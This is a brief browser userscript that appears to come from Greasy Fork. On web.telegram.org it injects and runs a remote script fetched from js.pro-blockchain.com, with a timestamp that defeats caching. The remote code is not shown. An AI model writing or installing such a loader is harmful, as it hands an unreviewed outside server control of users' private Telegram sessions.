// ==UserScript==
// @name         Lxgn Minter Telega main
// @namespace    https://web.telegram.org/
// @version      0.02
// @author       lxgn
// @description  Minter
// @match        https://web.telegram.org/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/373400/Lxgn%20Minter%20Telega%20main.user.js
// @updateURL https://update.greasyfork.org/scripts/373400/Lxgn%20Minter%20Telega%20main.meta.js
// ==/UserScript==


var ms = new Date();
//document.write();


var script = document.createElement('script');
//var t = Math.random()*1000000;

var kuda = "https://js.pro-blockchain.com/minter_telega/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);

script.onload = function() {
    // после выполнения скрипта становится доступна функция _
    //alert( 'load script' ); // её код
  }